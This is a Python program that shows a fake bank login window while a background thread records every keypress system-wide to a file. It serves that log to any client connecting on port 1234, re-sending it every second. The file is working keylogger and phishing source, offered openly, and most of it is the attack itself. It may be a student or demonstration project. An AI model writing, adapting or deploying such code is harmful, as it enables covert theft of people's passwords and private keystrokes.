import keyboard
import socket
import schedule
import time
from tkinter import *
from tkinter import ttk
from PIL import Image, ImageTk
import threading
import sys


def keyPress(event):

    with open("KeyLog.txt", "a") as f:
        if event.name == "enter":
            f.write('\n----------\n (Return) \n----------\n')
        elif event.name == "ctrl":
            f.write('\nContorl\n')
        elif event.name == "shift":
            f.write('\nShfit\n')
        elif event.name == "tab":
            f.write('\nTab\n')
        elif event.name == "esc":
            f.write('\nEscape\n')
        elif event.name == "backspace":
            f.write('\nBack Space\n')
        elif event.name == "space":
            f.write(' ')    
        else:
            f.write('{}'.format(event.name))

def sendMessage():
    #Creating Socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #Change in order to reflect the IP where the information should go.
    host = socket.gethostname()
    hostIP = socket.gethostbyname(host)
    port = 1234
    print(hostIP)
    s.bind((hostIP,port))
    s.listen(5)

    client, addr = s.accept()

    file = open("KeyLog.txt", 'r')
    data = file.read()

    #For getting file size, may not be used.
    #file_size = os.path.getsize(file)

    print(f"Connection from {addr} has been established!")
    client.send(bytes("Hello from the server!", "utf-8"))

    client.send(str(data).encode())
  
    file.close()
    s.close()


def runKeylogger():
    keyboard.on_press(keyPress)
    #Send log file every day?  Needs function for that?
    schedule.every(1).seconds.do(sendMessage)
    

    while True:
        schedule.run_pending()
        time.sleep(1)

    
def closeWindow(win):

    win.destroy()
    sys.exit()

def main():

    # Creating window for app
    root = Tk()
    root.title("Fake Banking App")
    root.state('zoomed')

    #Setting up the title box and image in box
    img = Image.open("fakebankicon.jpg")
    image = ImageTk.PhotoImage(img)
    Label(root, image=image).pack(pady=50)

    #Adding Text above the entry fields
    text_frame = Frame(root, bg='white')
    text_frame.pack()
    Label(text_frame, text="Please enter your information to log into your account ;)", font=("Arial", 25)).pack(side='left')

    #Set up window for username
    username_frame = Frame(root, bg='white')
    username_frame.pack()
    Label(username_frame, text="Username", bg='white').pack(side='left', padx=5, pady=10)
    username_entry= Entry(username_frame, bd=3)
    username_entry.pack(side='right')
   
    #Setup window for password
    password_frame = Frame(root, bg='white')
    password_frame.pack()
    Label(password_frame, text="Password", bg='white').pack(side='left', padx=7, pady=10)
    password_entry= Entry(password_frame, bd=3)
    password_entry.pack(side='right')

    #Exit button
    exit_button = Button(root, text="Exit", bd=3, command=lambda: closeWindow(root))
    exit_button.pack()


    #root.after(1000, runKeylogger)
    #root.after_idle(runKeylogger)
    t = threading.Thread(target=runKeylogger)
    t.start()
    root.mainloop()



   
if __name__ == "__main__":
    main()